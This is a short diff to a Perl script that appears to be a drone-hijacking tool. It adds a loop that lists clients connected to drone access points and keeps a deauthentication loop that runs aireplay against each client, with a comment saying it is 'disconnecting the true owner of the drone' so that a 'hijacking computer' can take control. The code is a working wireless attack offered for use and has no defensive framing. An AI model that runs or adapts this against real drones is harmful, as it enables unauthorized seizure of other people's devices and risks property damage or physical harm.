@@ -98,9 +98,14 @@ while (!%clients)
 		print "\n\n";
 }
 
+foreach my $cli (keys %clients)
+{
+    print "Found client ($cli) connected to $chans{$clients{$cli}}[1] ($clients{$cli}, channel $chans{$clients{$cli}}[0])\n";
+}
+
 # Give us some time so we can ready the hijacking computer
-print "Entering deauth loop in 3 seconds...";
-sleep 3;
+print "Press Enter to continue...\n";
+<STDIN>
 
 while (1) {
 
@@ -121,7 +126,7 @@ while (1) {
 			print "Disconnecting the true owner of the drone ;)\n\n";
 			sudo($aireplay, "-0", "32", "-a", $clients{$cli}, "-c", $cli, $interface);
 
-		}	
+		}
 
 		# go into managed mode
 		#sudo($airmon, "stop", $interface);
